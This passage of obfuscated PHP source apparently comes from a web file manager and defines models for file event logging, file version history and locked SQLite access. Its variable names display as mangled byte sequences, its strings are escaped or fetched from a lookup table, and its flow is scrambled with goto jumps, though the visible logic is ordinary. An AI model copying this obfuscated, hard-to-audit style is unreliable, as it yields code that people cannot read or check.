$c◊∆ı◊íÉà[2093] => $C«âıµ©óÆ[$c◊∆ı◊íÉà[2216]], $c◊∆ı◊íÉà[382] => $c◊∆ı◊íÉà[33], $c◊∆ı◊íÉà[2105] => $c◊∆ı◊íÉà[2259]); } } } class SourceEventModel extends ModelBase { protected $tableName = "\x69\157\x5f\x73\x6f\x75\x72\x63\x65\137\x65\x76\145\x6e\164"; protected $dataAuto = array(array("\x63\x72\x65\141\x74\x65\x54\151\x6d\145", "\164\151\155\x65", "\x69\156\163\145\x72\164", "\146\165\x6e\x63\164\x69\x6f\x6e"), array("\x64\145\163\x63", '', "\x69\156\x73\145\162\x74\54\x75\160\144\141\164\x65\54\x73\145\154\145\x63\x74", "\x6a\x73\x6f\x6e")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($A—˘ãÁÀ‘ﬁ, $B”‹¡†æ≠π, $d”¢√€˜Ω = '') { goto aÙΩàÀçû; Fç†Õä∑∑Ô: $f„è·†¥’¿ = array($a„»ÈûÖ‡ù[379] => $A—˘ãÁÀ‘ﬁ, $a„»ÈûÖ‡ù[2260] => $d›Ûıª§˘Ê[$a„»ÈûÖ‡ù[457]], $a„»ÈûÖ‡ù[2261] => $d›Ûıª§˘Ê[$a„»ÈûÖ‡ù[28]], $a„»ÈûÖ‡ù[462] => $d›Ûıª§˘Ê[$a„»ÈûÖ‡ù[462]], $a„»ÈûÖ‡ù[1415] => USER_ID, $a„»ÈûÖ‡ù[384] => $B”‹¡†æ≠π, $a„»ÈûÖ‡ù[1417] => $d”¢√€˜Ω); $this->addSystemLog($B”‹¡†æ≠π, $f„è·†¥’¿); return $this->add($f„è·†¥’¿); goto C¨«Çãá©Ü; AÈ ‡Ó»ëõ: if (!$d›Ûıª§˘Ê) { return !1; } if ($this->isCacheEvent($d›Ûıª§˘Ê, $B”‹¡†æ≠π)) { return; } if ($d”¢√€˜Ω && is_string($d”¢√€˜Ω)) { $d”¢√€˜Ω = array($a„»ÈûÖ‡ù[2117] => $d”¢√€˜Ω); } goto Fç†Õä∑∑Ô; aÙΩàÀçû: $a„»ÈûÖ‡ù =& $_SERVER[¯èãÄπµ]; if (!$this->eventSave) { return; } $d›Ûıª§˘Ê = Model($a„»ÈûÖ‡ù[1112])->sourceInfo($A—˘ãÁÀ‘ﬁ); goto AÈ ‡Ó»ëõ; C¨«Çãá©Ü: } private function addSystemLog($AìÑèŸ´∫ , $FÉ‰◊»‰ﬁÇ) { $BÙ≠µÛáÆ• =& $_SERVER[¯èãÄπµ]; if ($AìÑèŸ´∫  == $BÙ≠µÛáÆ•[2262]) { $AìÑèŸ´∫  = $FÉ‰◊»‰ﬁÇ[$BÙ≠µÛáÆ•[401]][$BÙ≠µÛáÆ•[2263]]; } else { if (in_array($AìÑèŸ´∫ , array($BÙ≠µÛáÆ•[2064], $BÙ≠µÛáÆ•[2264]))) { $AìÑèŸ´∫  = $FÉ‰◊»‰ﬁÇ[$BÙ≠µÛáÆ•[401]][$BÙ≠µÛáÆ•[695]]; } } $A›Í˘ÃÜ†é = array_merge($FÉ‰◊»‰ﬁÇ, array($BÙ≠µÛáÆ•[2265] => $FÉ‰◊»‰ﬁÇ[$BÙ≠µÛáÆ•[365]], $BÙ≠µÛáÆ•[2266] => $FÉ‰◊»‰ﬁÇ[$BÙ≠µÛáÆ•[2266]])); Model($BÙ≠µÛáÆ•[2028])->addLog($BÙ≠µÛáÆ•[2267] . $AìÑèŸ´∫ , $A›Í˘ÃÜ†é); } private function isCacheEvent($BÆÕòÀÿëõ, $F®±ÆŒªÚª) { if ($BÆÕòÀÿëõ[$_SERVER[¯èãÄπµ][367]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($f˘èìí¶∑Ö, $b∞Ü¡‘ÇàÖ) { $aŸ·ùë´®á =& $_SERVER[¯èãÄπµ]; $Cà°Ωç◊¶Ö = Model($aŸ·ùë´®á[1112])->sourceInfo($f˘èìí¶∑Ö); $a…ﬁõ…„±ù = array($aŸ·ùë´®á[2263] => $b∞Ü¡‘ÇàÖ, $aŸ·ùë´®á[28] => $Cà°Ωç◊¶Ö[$aŸ·ùë´®á[28]]); return $this->addEvent($f˘èìí¶∑Ö, $aŸ·ùë´®á[2262], $a…ﬁõ…„±ù); } public function eventFileEdit($D§∏å´¬»‘) { $AÇæÍÓÎÛ  =& $_SERVER[¯èãÄπµ]; $d¿±ú°Ú· = array($AÇæÍÓÎÛ [2268] => $_SERVER[$AÇæÍÓÎÛ [2269]], $AÇæÍÓÎÛ [1734] => strtolower(ACTION)); return $this->addEvent($D§∏å´¬»‘, $AÇæÍÓÎÛ [2055], $d¿±ú°Ú·); } public function eventRecycle($AùπΩçÃèü, $bËÔ†÷îä) { return $this->addEvent($AùπΩçÃèü, $_SERVER[¯èãÄπµ][2264], $bËÔ†÷îä); } public function eventRemove($dØﬂé¬∆Öá) { $eÿè”ÕÖ¡É =& $_SERVER[¯èãÄπµ]; $eéêÒ„ùÒÀ = Model($eÿè”ÕÖ¡É[1112])->sourceInfo($dØﬂé¬∆Öá); $Aø‹¥Ö ®§ = $eéêÒ„ùÒÀ[$eÿè”ÕÖ¡É[28]]; return $this->addEvent($eéêÒ„ùÒÀ[$eÿè”ÕÖ¡É[457]], $eÿè”ÕÖ¡É[2054], $Aø‹¥Ö ®§); } public function eventShare($FëË¨Û∫˜¡, $Bç‘ØÓ√Œ°) { return $this->addEvent($FëË¨Û∫˜¡, $_SERVER[¯èãÄπµ][2064], $Bç‘ØÓ√Œ°); } public function eventMove($a–ƒâ¯áÉ, $f¬¯Àœóøÿ, $aè®∏‰•òÊ) { goto f€ØÉ◊çœà; b¬ﬁ≈ú∆““: $this->addEvent($f¬¯Àœóøÿ, $aÖÔ‰ÉÔÜ§[2274], $b≥›àÍ¬ùù); goto A¯á¯ÕÉ‰÷; C¥µ®°“¨µ: $c ì–≈©Æ¶ = $A±›à˜ÂÑΩ->sourceInfo($f¬¯Àœóøÿ); $céÔÔÁ”èÉ = $A±›à˜ÂÑΩ->sourceInfo($aè®∏‰•òÊ); $b≥›àÍ¬ùù = array($aÖÔ‰ÉÔÜ§[1008] => $f¬¯Àœóøÿ, $aÖÔ‰ÉÔÜ§[2270] => $c ì–≈©Æ¶[$aÖÔ‰ÉÔÜ§[28]], $aÖÔ‰ÉÔÜ§[2271] => $c ì–≈©Æ¶[$aÖÔ‰ÉÔÜ§[462]], $aÖÔ‰ÉÔÜ§[1009] => $aè®∏‰•òÊ, $aÖÔ‰ÉÔÜ§[2272] => $céÔÔÁ”èÉ[$aÖÔ‰ÉÔÜ§[28]], $aÖÔ‰ÉÔÜ§[2273] => $céÔÔÁ”èÉ[$aÖÔ‰ÉÔÜ§[462]]); goto eä∑Ò®·≠; eä∑Ò®·≠: $this->addEvent($a–ƒâ¯áÉ, $aÖÔ‰ÉÔÜ§[488], $b≥›àÍ¬ùù); $bäúµ·é¶§ = $A±›à˜ÂÑΩ->sourceInfo($a–ƒâ¯áÉ); $b≥›àÍ¬ùù = array($aÖÔ‰ÉÔÜ§[365] => $bäúµ·é¶§[$aÖÔ‰ÉÔÜ§[365]], $aÖÔ‰ÉÔÜ§[28] => $bäúµ·é¶§[$aÖÔ‰ÉÔÜ§[28]]); goto b¬ﬁ≈ú∆““; f€ØÉ◊çœà: $aÖÔ‰ÉÔÜ§ =& $_SERVER[¯èãÄπµ]; $A±›à˜ÂÑΩ = Model($aÖÔ‰ÉÔÜ§[1112]); $bäúµ·é¶§ = $A±›à˜ÂÑΩ->sourceInfo($a–ƒâ¯áÉ); goto C¥µ®°“¨µ; A¯á¯ÕÉ‰÷: } public function eventCopy($f¬ØÏ™ûÀ÷) { $this->eventCreate($f¬ØÏ™ûÀ÷, $_SERVER[¯èãÄπµ][486]); } public function eventRename($E£û´ïí±Ü, $e‰´™ñÜ–Ã, $dï¶ìØµßÛ) { $Fçßñ¨ €Ü =& $_SERVER[¯èãÄπµ]; $C ”ï·¬¬É = array($Fçßñ¨ €Ü[1008] => $e‰´™ñÜ–Ã, $Fçßñ¨ €Ü[1009] => $dï¶ìØµßÛ); return $this->addEvent($E£û´ïí±Ü, $Fçßñ¨ €Ü[1124], $C ”ï·¬¬É); } public function eventAddComment($Fçä¥ÖÚ¥å, $eÖ¬„„Ç›Æ) { return $this->addEvent($Fçä¥ÖÚ¥å, $_SERVER[¯èãÄπµ][2275], $eÖ¬„„Ç›Æ); } public function eventAddDesc($DÂ“°Ç°ŒÕ, $f∆÷øòÙ¬ú) { return $this->addEvent($DÂ“°Ç°ŒÕ, $_SERVER[¯èãÄπµ][2276], $f∆÷øòÙ¬ú); } public function listBySource($b€≈é“íÍ≥) { goto DËËπ≈ùïµ; BÓçûùíøû: if ($Aå±‚˘€å[$DıΩÌî€Ïª[366]] == $DıΩÌî€Ïª[83]) { $E∏Ø≤Û»•Ç = Model($DıΩÌî€Ïª[1112])->listSearchChildren($b€≈é“íÍ≥, 20000); $E∏Ø≤Û»•Ç[] = $b€≈é“íÍ≥ . $DıΩÌî€Ïª[357]; $d›Ïü€…¢≤ = array($DıΩÌî€Ïª[365] => array($DıΩÌî€Ïª[7], $E∏Ø≤Û»•Ç)); } $eÂ·ØúÇë“ = $this->where($d›Ïü€…¢≤)->order($DıΩÌî€Ïª[2277])->selectPage(); if ($eÂ·ØúÇë“[$DıΩÌî€Ïª[347]][$DıΩÌî€Ïª[348]] == 0) { $eÂ·ØúÇë“[$DıΩÌî€Ïª[347]][$DıΩÌî€Ïª[348]] = 1; $eÂ·ØúÇë“[$DıΩÌî€Ïª[350]] = array(array($DıΩÌî€Ïª[379] => $b€≈é“íÍ≥, $DıΩÌî€Ïª[2260] => $Aå±‚˘€å[$DıΩÌî€Ïª[457]], $DıΩÌî€Ïª[1415] => $Aå±‚˘€å[$DıΩÌî€Ïª[374]], $DıΩÌî€Ïª[384] => $DıΩÌî€Ïª[2278], $DıΩÌî€Ïª[385] => $Aå±‚˘€å[$DıΩÌî€Ïª[183]], $DıΩÌî€Ïª[1417] => $DıΩÌî€Ïª[33])); } goto bÑ¡∑°‰¨∑; bÑ¡∑°‰¨∑: $eÂ·ØúÇë“ = $this->eventListParse($eÂ·ØúÇë“, $b€≈é“íÍ≥); show_json($eÂ·ØúÇë“); goto fËÒÈΩÖ±´; DËËπ≈ùïµ: $DıΩÌî€Ïª =& $_SERVER[¯èãÄπµ]; $Aå±‚˘€å = Model($DıΩÌî€Ïª[1112])->sourceInfo($b€≈é“íÍ≥); $d›Ïü€…¢≤ = array($DıΩÌî€Ïª[379] => $b€≈é“íÍ≥); goto BÓçûùíøû; fËÒÈΩÖ±´: } private function eventListParse($c‰Ó÷‹õÓ´, $d–á≈ﬂÜ©) { goto cΩ€íäü∂â; cΩ€íäü∂â: $DÕ¡åœª·† =& $_SERVER[¯èãÄπµ]; $bªÆç◊ó⁄Ö = $c‰Ó÷‹õÓ´[$DÕ¡åœª·†[350]]; $BÙﬂìªïä∂ = array_to_keyvalue($bªÆç◊ó⁄Ö, $DÕ¡åœª·†[33], $DÕ¡åœª·†[365]); goto dâ¨’≈–Ï‡; Cá‡¬ôí»Î: $BÙﬂìªïä∂ = array_unique($BÙﬂìªïä∂); $c™†Ÿ‚ÈèÆ = array_unique(array_to_keyvalue($bªÆç◊ó⁄Ö, $DÕ¡åœª·†[33], $DÕ¡åœª·†[1424])); $C¯Ñê§˘≈é = Model($DÕ¡åœª·†[473])->userListInfo($c™†Ÿ‚ÈèÆ); goto dÜüµÀ†ñå; dâ¨’≈–Ï‡: $Eî…ñ¡Â◊ê = array_to_keyvalue($bªÆç◊ó⁄Ö, $DÕ¡åœª·†[33], $DÕ¡åœª·†[2266]); foreach ($bªÆç◊ó⁄Ö as $fπÂπŸµ¬Ã) { $D≈‡â±Ωµ◊ = $fπÂπŸµ¬Ã[$DÕ¡åœª·†[401]]; if ($fπÂπŸµ¬Ã[$DÕ¡åœª·†[29]] == $DÕ¡åœª·†[488] && isset($D≈‡â±Ωµ◊[$DÕ¡åœª·†[1008]])) { $BÙﬂìªïä∂[] = $D≈‡â±Ωµ◊[$DÕ¡åœª·†[1008]] . $DÕ¡åœª·†[33]; $BÙﬂìªïä∂[] = $D≈‡â±Ωµ◊[$DÕ¡åœª·†[1009]] . $DÕ¡åœª·†[33]; } if ($fπÂπŸµ¬Ã[$DÕ¡åœª·†[29]] == $DÕ¡åœª·†[2274] && isset($D≈‡â±Ωµ◊[$DÕ¡åœª·†[365]])) { $BÙﬂìªïä∂[] = $D≈‡â±Ωµ◊[$DÕ¡åœª·†[365]] . $DÕ¡åœª·†[33]; } } $BÙﬂìªïä∂ = array_merge($BÙﬂìªïä∂, $Eî…ñ¡Â◊ê, array($d–á≈ﬂÜ© . $DÕ¡åœª·†[33])); goto Cá‡¬ôí»Î; dÜüµÀ†ñå: $D‰åüøÌà∏ = Model($DÕ¡åœª·†[755])->sourceListInfo($BÙﬂìªïä∂, !0); foreach ($bªÆç◊ó⁄Ö as &$fπÂπŸµ¬Ã) { if ($fπÂπŸµ¬Ã[$DÕ¡åœª·†[29]] == $DÕ¡åœª·†[488] && isset($fπÂπŸµ¬Ã[$DÕ¡åœª·†[401]][$DÕ¡åœª·†[1008]])) { $fπÂπŸµ¬Ã[$DÕ¡åœª·†[401]][$DÕ¡åœª·†[1008]] = $D‰åüøÌà∏[$fπÂπŸµ¬Ã[$DÕ¡åœª·†[401]][$DÕ¡åœª·†[1008]]]; $fπÂπŸµ¬Ã[$DÕ¡åœª·†[401]][$DÕ¡åœª·†[1009]] = $D‰åüøÌà∏[$fπÂπŸµ¬Ã[$DÕ¡åœª·†[401]][$DÕ¡åœª·†[1009]]]; } if ($fπÂπŸµ¬Ã[$DÕ¡åœª·†[29]] == $DÕ¡åœª·†[2274] && isset($fπÂπŸµ¬Ã[$DÕ¡åœª·†[401]][$DÕ¡åœª·†[365]])) { $fπÂπŸµ¬Ã[$DÕ¡åœª·†[401]][$DÕ¡åœª·†[365]] = $D‰åüøÌà∏[$fπÂπŸµ¬Ã[$DÕ¡åœª·†[401]][$DÕ¡åœª·†[365]]]; } $fπÂπŸµ¬Ã[$DÕ¡åœª·†[387]] = $D‰åüøÌà∏[$fπÂπŸµ¬Ã[$DÕ¡åœª·†[365]]]; $fπÂπŸµ¬Ã[$DÕ¡åœª·†[2279]] = $D‰åüøÌà∏[$fπÂπŸµ¬Ã[$DÕ¡åœª·†[2266]]]; if ($fπÂπŸµ¬Ã[$DÕ¡åœª·†[29]] == $DÕ¡åœª·†[2054]) { $fπÂπŸµ¬Ã[$DÕ¡åœª·†[2279]] = $fπÂπŸµ¬Ã[$DÕ¡åœª·†[387]]; $fπÂπŸµ¬Ã[$DÕ¡åœª·†[2266]] = $fπÂπŸµ¬Ã[$DÕ¡åœª·†[2279]][$DÕ¡åœª·†[365]]; $fπÂπŸµ¬Ã[$DÕ¡åœª·†[387]] = !1; $fπÂπŸµ¬Ã[$DÕ¡åœª·†[365]] = $DÕ¡åœª·†[33]; } $fπÂπŸµ¬Ã[$DÕ¡åœª·†[2224]] = $C¯Ñê§˘≈é[$fπÂπŸµ¬Ã[$DÕ¡åœª·†[1424]]]; } $c‰Ó÷‹õÓ´[$DÕ¡åœª·†[350]] = $bªÆç◊ó⁄Ö; goto F´»ÁÜ€Ï€; F´»ÁÜ€Ï€: return $c‰Ó÷‹õÓ´; goto fà€‰áöèŸ; fà€‰áöèŸ: } public function removeBySource($DﬂÕæ¬‡Ãü) { $AÊÖ◊ﬁ⁄ßÚ = array($_SERVER[¯èãÄπµ][379] => $DﬂÕæ¬‡Ãü); $this->where($AÊÖ◊ﬁ⁄ßÚ)->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\151\x6f\x5f\163\157\165\x72\x63\145\137\150\x69\x73\x74\157\x72\171"; public function addHistory($c«ü±æ¿áØ, $cΩÖ™±â‘ = '') { $a∑õ¢ÕŸïÜ =& $_SERVER[¯èãÄπµ]; $AªÀ¬ŒÊèñ = array($a∑õ¢ÕŸïÜ[379] => $c«ü±æ¿áØ[$a∑õ¢ÕŸïÜ[365]], $a∑õ¢ÕŸïÜ[1415] => isset($c«ü±æ¿áØ[$a∑õ¢ÕŸïÜ[375]]) ? $c«ü±æ¿áØ[$a∑õ¢ÕŸïÜ[375]] : $c«ü±æ¿áØ[$a∑õ¢ÕŸïÜ[374]], $a∑õ¢ÕŸïÜ[416] => $c«ü±æ¿áØ[$a∑õ¢ÕŸïÜ[415]], $a∑õ¢ÕŸïÜ[516] => $c«ü±æ¿áØ[$a∑õ¢ÕŸïÜ[77]], $a∑õ¢ÕŸïÜ[2280] => $cΩÖ™±â‘); $c‰ü•”çí = $GLOBALS[$a∑õ¢ÕŸïÜ[6]][$a∑õ¢ÕŸïÜ[84]][$a∑õ¢ÕŸïÜ[2281]]; if ($c‰ü•”çí > 1) { $this->historyAutoClear($AªÀ¬ŒÊèñ[$a∑õ¢ÕŸïÜ[365]]); $this->add($AªÀ¬ŒÊèñ); } Model($a∑õ¢ÕŸïÜ[2282])->eventFileEdit($c«ü±æ¿áØ[$a∑õ¢ÕŸïÜ[365]]); } private function historyAutoClear($d ‘á◊¡ÁÑ) { goto c›ÏíÛ≠¬‘; c›ÏíÛ≠¬‘: $AÑùßå¢◊Ü =& $_SERVER[¯èãÄπµ]; $eı™√ÁåØÕ = Model($AÑùßå¢◊Ü[1090])->get($AÑùßå¢◊Ü[2283]); $EçÀèéﬁ¬¬ = $GLOBALS[$AÑùßå¢◊Ü[6]][$AÑùßå¢◊Ü[84]][$AÑùßå¢◊Ü[2281]]; goto C≠ÃüÃª°; C”ïá‡îíó: $c”—Ú⁄ïäà = array($AÑùßå¢◊Ü[381] => array($AÑùßå¢◊Ü[7], $Bì‹ŸÕÉ¯€)); $this->where($c”—Ú⁄ïäà)->delete(); Model($AÑùßå¢◊Ü[418])->remove($B©⁄ÑÂ£Ã±); goto b†œºî¢Œ©; F√€î˜Œ›¬: if ($C±öÈò±Ùë >= 500) { return; } $c”—Ú⁄ïäà = array($AÑùßå¢◊Ü[379] => $d ‘á◊¡ÁÑ); $aØò∏Ì÷á‰ = $this->field($AÑùßå¢◊Ü[2285])->where($c”—Ú⁄ïäà)->order($AÑùßå¢◊Ü[2277])->select(); goto Aç•®¯ØƒÉ; AÖÌœÁó”ë: $B©⁄ÑÂ£Ã± = array_to_keyvalue($aØò∏Ì÷á‰, $AÑùßå¢◊Ü[33], $AÑùßå¢◊Ü[415]); $B©⁄ÑÂ£Ã± = array_slice($B©⁄ÑÂ£Ã±, $C±öÈò±Ùë); if (!$Bì‹ŸÕÉ¯€ || !$B©⁄ÑÂ£Ã±) { return; } goto C”ïá‡îíó; Aç•®¯ØƒÉ: if (!$aØò∏Ì÷á‰ || $C±öÈò±Ùë >= count($aØò∏Ì÷á‰)) { return; } $Bì‹ŸÕÉ¯€ = array_to_keyvalue($aØò∏Ì÷á‰, $AÑùßå¢◊Ü[33], $AÑùßå¢◊Ü[363]); $Bì‹ŸÕÉ¯€ = array_slice($Bì‹ŸÕÉ¯€, $C±öÈò±Ùë); goto AÖÌœÁó”ë; C≠ÃüÃª°: $DÑ€§åòïå = $eı™√ÁåØÕ == $AÑùßå¢◊Ü[2284] ? 3 : $EçÀèéﬁ¬¬; if ($EçÀèéﬁ¬¬ <= 1) { $DÑ€§åòïå = 1; } $C±öÈò±Ùë = $DÑ€§åòïå - 1; goto F√€î˜Œ›¬; b†œºî¢Œ©: } public function listData($aÇæÕ⁄é˘ÿ) { goto c’õÎº∂œ; E≤∫Ó”ûìƒ: $aêÂÌÏ…ò’ = 3; if ($fé◊èÇãÜﬂ == $FºÉï§∂∂Ñ[2284]) { $Cáﬂ§⁄ôÇè[$FºÉï§∂∂Ñ[350]] = array_slice($Cáﬂ§⁄ôÇè[$FºÉï§∂∂Ñ[350]], 0, $aêÂÌÏ…ò’); $Cáﬂ§⁄ôÇè[$FºÉï§∂∂Ñ[347]] = array($FºÉï§∂∂Ñ[2287] => 1, $FºÉï§∂∂Ñ[2288] => 20, $FºÉï§∂∂Ñ[2289] => 1, $FºÉï§∂∂Ñ[2290] => count($Cáﬂ§⁄ôÇè[$FºÉï§∂∂Ñ[350]])); } return $Cáﬂ§⁄ôÇè; goto D„äô √Éë; c’õÎº∂œ: $FºÉï§∂∂Ñ =& $_SERVER[¯èãÄπµ]; $fˆƒÀ…¯Ú¡ = array($FºÉï§∂∂Ñ[379] => $aÇæÕ⁄é˘ÿ); $e¶á™ìß›ù = $FºÉï§∂∂Ñ[2286]; goto CëùÕê€Èê; CëùÕê€Èê: $Cáﬂ§⁄ôÇè = $this->field($e¶á™ìß›ù)->where($fˆƒÀ…¯Ú¡)->order($FºÉï§∂∂Ñ[2277])->selectPage(); $this->_listAppendUser($Cáﬂ§⁄ôÇè[$FºÉï§∂∂Ñ[350]]); $fé◊èÇãÜﬂ = Model($FºÉï§∂∂Ñ[1090])->get($FºÉï§∂∂Ñ[2283]); goto E≤∫Ó”ûìƒ; D„äô √Éë: } protected function _listAppendUser(&$C◊◊≥æ¯¬≠) { $F™®‡∆ô Ô =& $_SERVER[¯èãÄπµ]; $eÑ°Í∏—Ö” = array_to_keyvalue($C◊◊≥æ¯¬≠, $F™®‡∆ô Ô[33], $F™®‡∆ô Ô[1424]); $dÓË∑í»Ö = Model($F™®‡∆ô Ô[473])->userListInfo($eÑ°Í∏—Ö”); foreach ($C◊◊≥æ¯¬≠ as &$Dâ¥Í‚Ô…î) { $C÷Ÿ≠ù‹∆ú = $Dâ¥Í‚Ô…î[$F™®‡∆ô Ô[1424]]; $Dâ¥Í‚Ô…î[$F™®‡∆ô Ô[374]] = $dÓË∑í»Ö[$C÷Ÿ≠ù‹∆ú] ? $dÓË∑í»Ö[$C÷Ÿ≠ù‹∆ú] : !1; } } public function fileInfo($Cçì“÷Ã›¢) { $cÆüÁªèÙ› =& $_SERVER[¯èãÄπµ]; $DçÊÖ¶Ãèº = $this->tablePrefix; $D˘ÖÏªÓÎï = "{$DçÊÖ¶Ãèº}\x69\157\x5f\146\151\154\x65\40\146\x69\154\145\163\40\157\156\40\x66\x69\154\145\163\56\146\x69\154\x65\x49\x44\40\x3d\x20\x68\x69\163\x74\x6f\x72\171\56\x66\x69\154\x65\x49\x44"; return $this->alias($cÆüÁªèÙ›[2291])->where(array($cÆüÁªèÙ›[381] => $Cçì“÷Ã›¢))->join($D˘ÖÏªÓÎï, $cÆüÁªèÙ›[2292])->find(); } public function removeItem($EêûÓŒ§ÇÊ) { $Fò¡âãÃù =& $_SERVER[¯èãÄπµ]; $EÛ≠ßÕ¯óô = array($Fò¡âãÃù[381] => $EêûÓŒ§ÇÊ); $CÕäÜ¢ÌÙ§ = $this->where($EÛ≠ßÕ¯óô)->find(); if ($CÕäÜ¢ÌÙ§) { $DÇœô∏”±ë = $this->where($EÛ≠ßÕ¯óô)->delete(); Model($Fò¡âãÃù[418])->remove($CÕäÜ¢ÌÙ§[$Fò¡âãÃù[415]]); return $DÇœô∏”±ë; } return !1; } public function removeBySource($D√Èù‚‘∂é) { goto d´»äÚÚÈÖ; FßÚÜÕïíÙ: $Bæ∫ﬂ¥„¬œ = array($e€ÁΩÁ©êú[379] => array($e€ÁΩÁ©êú[7], $D√Èù‚‘∂é)); $CÕñŸÇ÷ÀÂ = $this->field($e€ÁΩÁ©êú[416])->where($Bæ∫ﬂ¥„¬œ)->select(); if ($CÕñŸÇ÷ÀÂ) { $this->where($Bæ∫ﬂ¥„¬œ)->delete(); $e≤Ø¿Æº„• = array_to_keyvalue($CÕñŸÇ÷ÀÂ, $e€ÁΩÁ©êú[33], $e€ÁΩÁ©êú[415]); Model($e€ÁΩÁ©êú[418])->remove($e≤Ø¿Æº„•); } goto AëÊè…ÆØ«; AëÊè…ÆØ«: return !0; goto AéΩÕÿõ†µ; d´»äÚÚÈÖ: $e€ÁΩÁ©êú =& $_SERVER[¯èãÄπµ]; if (!$D√Èù‚‘∂é) { return !1; } if (!is_array($D√Èù‚‘∂é)) { $D√Èù‚‘∂é = array($D√Èù‚‘∂é); } goto FßÚÜÕïíÙ; AéΩÕÿõ†µ: } public function setDetail($D∞µ—àÔÖô, $BÌªÊµìÚ∑) { $CîÚ≤”…öá =& $_SERVER[¯èãÄπµ]; return $this->where(array($CîÚ≤”…öá[381] => $D∞µ—àÔÖô))->save(array($CîÚ≤”…öá[2280] => $BÌªÊµìÚ∑)); } public function rollbackToItem($dØﬁ”‹ˆ´Î, $C“ﬂä˜ô–—) { goto DÆ⁄Ûï®âõ; cõá˘ö˘ã”: $c˘®˜Ù≈∆£ = $this->find($C“ﬂä˜ô–—); $D“ºÍÜ†¯Â = array($f•»≈™Ûò[415] => $c˘®˜Ù≈∆£[$f•»≈™Ûò[415]], $f•»≈™Ûò[77] => $c˘®˜Ù≈∆£[$f•»≈™Ûò[77]], $f•»≈™Ûò[106] => time(), $f•»≈™Ûò[375] => USER_ID); Model($f•»≈™Ûò[755])->where(array($f•»≈™Ûò[365] => $dØﬁ”‹ˆ´Î))->save($D“ºÍÜ†¯Â); goto f¬≈≥˘âÚø; DÆ⁄Ûï®âõ: $f•»≈™Ûò =& $_SERVER[¯èãÄπµ]; $EŒôºì ëù = Model($f•»≈™Ûò[755])->sourceInfo($dØﬁ”‹ˆ´Î); $this->addHistory($EŒôºì ëù); goto cõá˘ö˘ã”; f¬≈≥˘âÚø: return $this->where(array($f•»≈™Ûò[381] => $C“ﬂä˜ô–—))->delete(); goto c€ƒÉ Ω“É; c€ƒÉ Ω“É: } public function clearSame($d∆ã◊ÔÂÎ¢) { goto DÏƒ¡°ß⁄÷; DÏƒ¡°ß⁄÷: $cüÊÒéçﬂ» =& $_SERVER[¯èãÄπµ]; $c…ÏÁÎé◊Ñ = $this->listData($d∆ã◊ÔÂÎ¢); $dÔ„úÔÎõ… = array_to_keyvalue_group($c…ÏÁÎé◊Ñ, $cüÊÒéçﬂ»[415]); goto E∆„ûñ‹“Ÿ; E∆„ûñ‹“Ÿ: $f∑º‡é««µ = array(); $c¢«Õ€Üµ  = array(); foreach ($dÔ„úÔÎõ… as $CäÆîä‚‡æ) { if (!$CäÆîä‚‡æ || count($CäÆîä‚‡æ) <= 1) { continue; } foreach ($CäÆîä‚‡æ as $A∏èßÙ∑ÿß) { $f∑º‡é««µ[] = $A∏èßÙ∑ÿß[$cüÊÒéçﬂ»[415]]; $c¢«Õ€Üµ [] = $A∏èßÙ∑ÿß[$cüÊÒéçﬂ»[363]]; } } goto E¨ç“Œóåû; E¨ç“Œóåû: if (!$c¢«Õ€Üµ ) { return; } $this->where(array($cüÊÒéçﬂ»[363] => array($cüÊÒéçﬂ»[7], $c¢«Õ€Üµ )))->delete(); Model($cüÊÒéçﬂ»[418])->remove($f∑º‡é««µ); goto AÊ√ûπÔÇ∫; AÊ√ûπÔÇ∫: } public function userSpace() { $B®êú»äØÜ =& $_SERVER[¯èãÄπµ]; $c¥–´„êÊÌ = $this->tablePrefix; $f◊ﬂºÿ»ª¬ = array($B®êú»äØÜ[1415] => USER_ID); $DÖéå’€Ãﬁ = "{$c¥–´„êÊÌ}\151\x6f\137\x66\151\154\x65\40\146\x69\x6c\x65\163\x20\x6f\156\40\146\151\154\x65\163\x2e\x66\x69\x6c\x65\x49\x44\x20\75\40\150\151\x73\x74\157\162\x79\x2e\146\x69\x6c\145\111\104"; return $this->alias($B®êú»äØÜ[2291])->where($f◊ﬂºÿ»ª¬)->join($DÖéå’€Ãﬁ, $B®êú»äØÜ[2292])->sum($B®êú»äØÜ[77]); } } goto a–«÷ùàíÜ; cÊ¡Ü∆ç¨Ì: class DbSqlite3 extends DbSqlite3Base { public function query($A¡æªâ√ƒ√) { goto fêää≠Ë≈®; fêää≠Ë≈®: $Fºää¥ÑÏÓ =& $_SERVER[¯èãÄπµ]; $càï¡ë¿ƒÙ = DATA_PATH . $Fºää¥ÑÏÓ[876]; $EÇ‹Á÷“Ó∏ = fopen($càï¡ë¿ƒÙ, $Fºää¥ÑÏÓ[877]); goto FÚ–¨õ§É‚; FÚ–¨õ§É‚: if (!$EÇ‹Á÷“Ó∏) { return !1; } if (flock($EÇ‹Á÷“Ó∏, LOCK_EX)) { $f∫ßÙ¯É†í = parent::query($A¡æªâ√ƒ√); flock($EÇ‹Á÷“Ó∏, LOCK_UN); fclose($EÇ‹Á÷“Ó∏); return $f∫ßÙ¯É†í; } flock($EÇ‹Á÷“Ó∏, LOCK_UN); goto fÖ¡Ù®ìÜ†; fÖ¡Ù®ìÜ†: fclose($EÇ‹Á÷“Ó∏); show_json($Fºää¥ÑÏÓ[878], !1); return !1; goto a†≠Ç´»†é; a†≠Ç´»†é: } public function execute($EÓŸÒóåÉ ) { goto B∑ëèÕ≤ëÑ; CÜŒÍëˆ≈Ã: fclose($aëê‘ﬂ»£«); show_json($DñÉΩ˘‰ìç[878], !1); return !1; goto a—ØÑÃ“Íó; B∑ëèÕ≤ëÑ: $DñÉΩ˘‰ìç =& $_SERVER[¯èãÄπµ]; $f≠£ıê≠çÕ = DATA_PATH . $DñÉΩ˘‰ìç[876]; $aëê‘ﬂ»£« = fopen($f≠£ıê≠çÕ, $DñÉΩ˘‰ìç[877]); goto D»äÔ«îÒ“; D»äÔ«îÒ“: if (!$aëê‘ﬂ»£«) { return !1; } if (flock($aëê‘ﬂ»£«, LOCK_EX)) { $AË…„ıãÉµ = parent::execute($EÓŸÒóåÉ ); flock($aëê‘ﬂ»£«, LOCK_UN); fclose($aëê‘ﬂ»£«); return $AË…„ıãÉµ; } flock($aëê‘ﬂ»£«, LOCK_UN); goto CÜŒÍëˆ≈Ã; a—ØÑÃ“Íó: } } class Db { protected 